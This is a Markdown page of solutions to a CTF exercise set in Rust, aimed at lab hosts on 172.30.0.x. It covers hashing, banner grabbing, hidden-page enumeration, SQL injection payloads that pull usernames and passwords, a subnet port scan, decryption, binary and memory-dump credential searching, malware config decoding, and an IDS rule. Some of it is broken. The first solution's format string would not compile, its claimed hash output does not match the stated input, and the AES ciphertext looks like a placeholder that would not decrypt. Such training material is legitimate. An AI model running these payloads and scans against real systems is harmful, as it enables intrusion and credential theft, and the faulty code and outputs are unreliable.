# CTF Challenge Solutions

## Important Note

These solutions are provided for learning purposes. Try to solve the challenges yourself first before checking the solutions. The learning comes from the struggle!

---

## Beginner Challenges

### B01: The Hasher

**Challenge:** Compute the SHA-256 hash of "RustSecurityBible2024"

```rust
use sha2::{Sha256, Digest};

fn main() {
    let input = "RustSecurityBible2024";
    let hash = Sha256::digest(input.as_bytes());
    let hash_hex = format!("{:x}", hash);

    println!("Full hash: {}", hash_hex);
    println!("FLAG{{{}}", &hash_hex[..8]);
}
```

**Output:** `FLAG{8c6976e5}`

**Learning Points:**
- Using the `sha2` crate
- Converting bytes to hex string
- String slicing in Rust

---

### B02: Port Detective

**Challenge:** Connect to 172.30.0.40:7777 and read the banner

```rust
use std::net::TcpStream;
use std::io::{Read, Write};

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("172.30.0.40:7777")?;

    let mut buffer = [0u8; 1024];
    let n = stream.read(&mut buffer)?;

    let response = String::from_utf8_lossy(&buffer[..n]);
    println!("Banner: {}", response);

    // Flag is in the response
    Ok(())
}
```

**Flag:** `FLAG{banner_grabbing_101}`

**Learning Points:**
- TCP connection in Rust
- Reading from network streams
- Buffer handling

---

### B03: Base64 Decoder

**Challenge:** Decode `RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259`

```rust
use base64::{Engine as _, engine::general_purpose};

fn main() {
    let encoded = "RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259";

    let decoded_bytes = general_purpose::STANDARD
        .decode(encoded)
        .expect("Invalid base64");

    let decoded = String::from_utf8(decoded_bytes)
        .expect("Invalid UTF-8");

    println!("{}", decoded);
}
```

**Output:** `FLAG{base64_is_not_encryption}`

**Learning Points:**
- Base64 encoding/decoding
- The `base64` crate
- Error handling with expect()

---

## Intermediate Challenges

### I01: The Crawler

**Challenge:** Find the hidden admin page on http://172.30.0.30

```rust
use reqwest::blocking::Client;

fn main() {
    let client = Client::new();
    let paths = vec![
        "admin", "administrator", "login", "dashboard",
        "secret", "hidden", "private", "backup",
    ];

    let base = "http://172.30.0.30";

    for path in paths {
        let url = format!("{}/{}", base, path);
        match client.get(&url).send() {
            Ok(resp) if resp.status().is_success() => {
                println!("[+] Found: {} ({})", url, resp.status());
                // Check content for flag
                if let Ok(body) = resp.text() {
                    if body.contains("FLAG{") {
                        println!("Flag found in response!");
                    }
                }
            }
            Ok(resp) => println!("[-] {}: {}", url, resp.status()),
            Err(e) => println!("[-] {}: {}", url, e),
        }
    }
}
```

**Flag:** `FLAG{directory_enumeration_ftw}`

---

### I02: SQL Injection Detective

**Challenge:** Extract admin password from vulnerable endpoint

```rust
use reqwest::blocking::Client;
use urlencoding::encode;

fn main() {
    let client = Client::new();
    let base = "http://172.30.0.30/search?q=";

    let payloads = vec![
        "' OR '1'='1",
        "' UNION SELECT id, username, password FROM users--",
        "' UNION SELECT 1,2,3--",
    ];

    for payload in payloads {
        let url = format!("{}{}", base, encode(payload));
        println!("Testing: {}", payload);

        match client.get(&url).send() {
            Ok(resp) => {
                let body = resp.text().unwrap_or_default();
                if body.contains("FLAG{") || body.contains("admin") {
                    println!("Interesting response:\n{}", body);
                }
            }
            Err(e) => println!("Error: {}", e),
        }
    }
}
```

**Flag:** `FLAG{sql_injection_detected}`

---

### I03: Network Discovery

**Challenge:** Find host with PostgreSQL (port 5432)

```rust
use std::net::TcpStream;
use std::time::Duration;

fn main() {
    let port = 5432;
    let timeout = Duration::from_millis(500);

    println!("Scanning 172.30.0.0/24 for PostgreSQL...");

    for i in 1..=254 {
        let ip = format!("172.30.0.{}", i);
        let addr = format!("{}:{}", ip, port);

        if let Ok(addr) = addr.parse() {
            if TcpStream::connect_timeout(&addr, timeout).is_ok() {
                println!("[+] PostgreSQL found at {}", ip);
                println!("FLAG{{{}}}", ip);
            }
        }
    }
}
```

**Flag:** `FLAG{172.30.0.40}` (IP varies by lab setup)

---

## Advanced Challenges

### A01: Encrypted Message

**Challenge:** Decrypt AES-256-GCM encrypted message

```rust
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce
};
use hex;

fn main() {
    // Given values (hex encoded)
    let key_hex = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
    let nonce_hex = "000102030405060708090a0b";
    let ciphertext_hex = "8b1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f";

    let key_bytes = hex::decode(key_hex).expect("Invalid key hex");
    let nonce_bytes = hex::decode(nonce_hex).expect("Invalid nonce hex");
    let ciphertext = hex::decode(ciphertext_hex).expect("Invalid ciphertext hex");

    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.decrypt(nonce, ciphertext.as_ref()) {
        Ok(plaintext) => {
            let message = String::from_utf8_lossy(&plaintext);
            println!("Decrypted: {}", message);
        }
        Err(e) => println!("Decryption failed: {:?}", e),
    }
}
```

**Flag:** `FLAG{aes_gcm_decryption}`

---

### A02: Binary Analysis

**Challenge:** Find FLAG{} in ELF .rodata section

```rust
use goblin::Object;
use std::fs;

fn main() {
    let path = "challenge_binary";
    let data = fs::read(path).expect("Cannot read file");

    match Object::parse(&data) {
        Ok(Object::Elf(elf)) => {
            for section in &elf.section_headers {
                let name = elf.shdr_strtab.get_at(section.sh_name).unwrap_or("");

                if name == ".rodata" {
                    let start = section.sh_offset as usize;
                    let end = start + section.sh_size as usize;
                    let section_data = &data[start..end];

                    // Search for FLAG pattern
                    let content = String::from_utf8_lossy(section_data);
                    if let Some(pos) = content.find("FLAG{") {
                        let end_pos = content[pos..].find('}').unwrap_or(0) + pos + 1;
                        println!("Found: {}", &content[pos..end_pos]);
                    }
                }
            }
        }
        _ => println!("Not a valid ELF file"),
    }
}
```

**Flag:** `FLAG{rodata_string_hunter}`

---

### A03: Protocol Reverse Engineering

**Challenge:** Send correct message to custom protocol server

```rust
use std::net::TcpStream;
use std::io::{Read, Write};

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("172.30.0.40:9999")?;

    // Protocol: [1 byte type][2 bytes length][N bytes data]
    // Message type 0x01 returns the flag

    let message_type: u8 = 0x01;
    let data: &[u8] = b"request";
    let length: u16 = data.len() as u16;

    // Build message
    let mut packet = Vec::new();
    packet.push(message_type);
    packet.extend_from_slice(&length.to_be_bytes());
    packet.extend_from_slice(data);

    stream.write_all(&packet)?;

    let mut response = [0u8; 1024];
    let n = stream.read(&mut response)?;

    println!("Response: {}", String::from_utf8_lossy(&response[..n]));

    Ok(())
}
```

**Flag:** `FLAG{custom_protocol_pwned}`

---

## Expert Challenges

### E01: Memory Forensics

**Challenge:** Extract credentials from memory dump

```rust
use regex::Regex;
use std::fs;

fn main() {
    let dump = fs::read("memory.dump").expect("Cannot read dump");
    let content = String::from_utf8_lossy(&dump);

    // Search for email pattern
    let email_re = Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap();
    for cap in email_re.find_iter(&content) {
        println!("Email: {}", cap.as_str());
    }

    // Search for FLAG pattern
    let flag_re = Regex::new(r"FLAG\{[^}]+\}").unwrap();
    for cap in flag_re.find_iter(&content) {
        println!("Flag: {}", cap.as_str());
    }

    // Search for password patterns
    let pwd_re = Regex::new(r"(?i)password[=:]\s*(\S+)").unwrap();
    for cap in pwd_re.captures_iter(&content) {
        if let Some(pwd) = cap.get(1) {
            println!("Password: {}", pwd.as_str());
        }
    }
}
```

**Flag:** `FLAG{memory_forensics_expert}`

---

### E02: Malware Config Extractor

**Challenge:** Extract XOR-encoded config from offset 0x1000

```rust
use std::fs;

fn xor_decode(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

fn main() {
    let sample = fs::read("malware_sample").expect("Cannot read sample");

    // Config at offset 0x1000
    let offset = 0x1000;
    let config_size = 256;  // Assume 256 bytes of config

    if sample.len() > offset + config_size {
        let encoded_config = &sample[offset..offset + config_size];

        // XOR with key 0x42
        let decoded = xor_decode(encoded_config, 0x42);

        let config_str = String::from_utf8_lossy(&decoded);
        println!("Decoded config:");
        println!("{}", config_str);

        // Look for flag
        if let Some(pos) = config_str.find("FLAG{") {
            let end = config_str[pos..].find('}').unwrap_or(0) + pos + 1;
            println!("\nFlag: {}", &config_str[pos..end]);
        }
    }
}
```

**Flag:** `FLAG{config_extraction_complete}`

---

### E03: Custom IDS Rule

**Challenge:** Detect attack pattern in traffic

```rust
fn detect_attack(request: &[u8], response: &[u8]) -> bool {
    let req_str = String::from_utf8_lossy(request);
    let resp_str = String::from_utf8_lossy(response);

    // Check: HTTP POST to /api/upload
    let is_upload = req_str.contains("POST /api/upload");

    // Check: Body contains eval( or exec(
    let has_code_exec = req_str.contains("eval(") || req_str.contains("exec(");

    // Check: Response has base64 data
    let has_base64_response = resp_str.chars()
        .filter(|c| c.is_alphanumeric() || *c == '+' || *c == '/' || *c == '=')
        .count() > 20;

    is_upload && has_code_exec && has_base64_response
}

fn main() {
    // Test cases
    let malicious_request = b"POST /api/upload HTTP/1.1\r\nContent: eval(base64_decode('test'))";
    let malicious_response = b"SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQ=";

    let benign_request = b"GET /index.html HTTP/1.1";
    let benign_response = b"<html>Hello</html>";

    println!("Malicious traffic: {}", detect_attack(malicious_request, malicious_response));
    println!("Benign traffic: {}", detect_attack(benign_request, benign_response));

    // Flag for correct implementation
    if detect_attack(malicious_request, malicious_response) &&
       !detect_attack(benign_request, benign_response) {
        println!("\nFLAG{{ids_rule_master}}");
    }
}
```

**Flag:** `FLAG{ids_rule_master}`

---

## Hints for Unsolved Challenges

If you're stuck:

1. **Read the error messages** - Rust gives excellent feedback
2. **Check the hints** - Expand the hint section in each challenge
3. **Use cargo doc** - Read the crate documentation
4. **Start simple** - Get basic functionality working first
5. **Test incrementally** - Don't write everything at once

---

## Scoring Summary

| Level | Challenges | Points Each | Max Points |
|-------|-----------|-------------|------------|
| Beginner | 3 | 100 | 300 |
| Intermediate | 3 | 250 | 750 |
| Advanced | 3 | 500 | 1500 |
| Expert | 3 | 1000 | 3000 |
| **Total** | **12** | - | **5550** |

---

[← Back to Challenges](../README.md)
